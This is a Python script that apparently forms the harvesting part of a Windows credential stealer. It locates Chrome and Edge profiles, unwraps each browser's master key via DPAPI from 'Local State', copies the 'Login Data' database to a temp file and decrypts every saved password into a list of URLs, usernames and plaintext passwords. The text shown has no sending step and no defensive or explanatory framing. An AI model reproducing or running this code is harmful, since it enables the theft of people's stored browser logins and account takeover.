import os, json, base64, sqlite3, shutil
import win32crypt
from Cryptodome.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def encrypt(path):
    try:
        with open(os.path.join(path, "Local State"), encoding="utf-8") as f:
            key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: 
        return None

def decrypt(buff, key):
    try:
        iv, payload = buff[3:15], buff[15:]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
    except:
        try: 
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except: 
            return ""

def ext():
    res = []
    for browser, path in PATHS.items():
        if not os.path.exists(path): 
            continue

        key = encrypt(path)
        if not key: 
            continue

        for profile in os.listdir(path):
            if profile != "Default" and not profile.startswith("Profile"): 
                continue

            db_path = os.path.join(path, profile, "Login Data")
            if not os.path.exists(db_path): 
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), "tmp.db")
            shutil.copy2(db_path, tmp_db)
            
            conn = sqlite3.connect(tmp_db)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")

            for url, user, pwd in cur.fetchall():
                if user or pwd: 
                    res.append({
                        "browser": browser,
                        "profile": profile,
                        "url": url,
                        "username": user,
                        "password": decrypt(pwd, key)
                    })
            cur.close()
            conn.close()
            os.remove(tmp_db)

    return res